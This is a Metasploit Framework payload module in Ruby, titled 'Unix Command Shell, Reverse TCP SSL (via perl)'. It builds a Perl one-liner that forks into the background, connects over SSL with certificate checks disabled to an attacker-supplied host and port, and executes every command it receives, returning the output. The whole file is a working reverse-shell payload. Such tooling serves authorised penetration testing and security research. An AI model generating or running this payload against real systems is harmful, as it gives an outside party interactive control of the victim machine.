##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 173

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Reverse TCP SSL (via perl)',
     'Description'   => 'Creates an interactive shell via perl, uses SSL',
     'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
     'License'       => BSD_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseTcpSsl,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'perl',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('PerlPath', [true, 'The path to the Perl executable', 'perl'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    cmd = "#{datastore['PerlPath']} -e 'use IO::Socket::SSL;$p=fork;exit,if($p);"
    cmd += "$c=IO::Socket::SSL->new(PeerAddr=>\"#{lhost}:#{datastore['LPORT']}\",SSL_verify_mode=>0);"
    cmd += "while(sysread($c,$i,8192)){syswrite($c,`$i`);}'"
  end
end
